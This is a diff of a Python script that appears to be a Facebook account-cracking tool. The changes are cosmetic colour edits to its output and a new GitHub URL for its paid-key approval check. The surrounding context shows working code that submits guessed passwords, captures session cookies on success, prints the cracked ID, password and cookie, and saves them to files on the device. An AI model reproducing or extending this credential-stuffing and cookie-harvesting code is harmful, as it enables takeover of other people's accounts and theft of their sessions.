@@ -253,7 +253,7 @@ def sxr_f_m1(ids,names,pswdx):
             sxr_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
             if 'session_key' in sxr_respns:
                 coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
-                print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
+                print(f"\r\033[38;5;196m[SUCCESS-💚] {ids} | {pww}")
                 if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                 open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                 open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')
@@ -297,7 +297,7 @@ def sxr_f_m2(ids,names,pswdx):
             if 'session_key' in sxr_respns:
                 coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                 print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
-                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
+                if 'y' in pmsn_ckki:print(f"\r\033[38;5;196mCOOKIE : {coki}\n")
                 open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                 open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')
                 oks.append(ids)
@@ -361,7 +361,7 @@ def sxr_f_m3(ids,names,pswdx):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid=re.findall("c_user=(.*);xs", coki)[0]
                 print(f"\r\r {b}[SUCCESS-💚] {uid} | {pww}")
-                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
+                if 'y' in pmsn_ckki:print(f"\r\033[38;5;196mCOOKIE : {coki}\n")
                 open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(uid+'|'+pww+'|'+coki+'\n')
                 open("/sdcard/SMILE-FILE-OK.txt","a").write(uid+'|'+pww+'\n')                
                 oks.append(uid)
@@ -405,7 +405,7 @@ def sxr_f_m4(ids,names,pswdx):
             if 'session_key' in sxr_respns:
                 coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                 print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
-                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
+                if 'y' in pmsn_ckki:print(f"\r\033[38;5;196mCOOKIE : {coki}\n")
                 open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                 open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')                
                 oks.append(ids)
@@ -449,7 +449,7 @@ def sxr_f_m5(ids,names,pswdx):
             if 'session_key' in sxr_respns:
                 coki = ';'.join(i['name']+'='+i['value'] for i in sxr_respns['session_cookies'])
                 print(f"\r\r {b}[SUCCESS-💚] {ids} | {pww}")
-                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
+                if 'y' in pmsn_ckki:print(f"\r\033[38;5;196mCOOKIE : {coki}\n")
                 open("/sdcard/SMILE-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                 open("/sdcard/SMILE-FILE-OK.txt","a").write(ids+'|'+pww+'\n')                
                 oks.append(ids)
@@ -974,7 +974,7 @@ def Subscraption():
 	id = "".join(uuid+sk+lk)
 	key1 = UMO+id+ML1
 	Key2 = ATOM+key1
-	r1=requests.get("https://github.com/DESTROYED-ATOM/approve/blob/main/approve.txt").text
+	r1=requests.get("https://github.com/ATONxSMILE404/Approve.txt/blob/main/Aporove").text
 	if Key2 in r1:
 		os.system('clear')
 		menu()
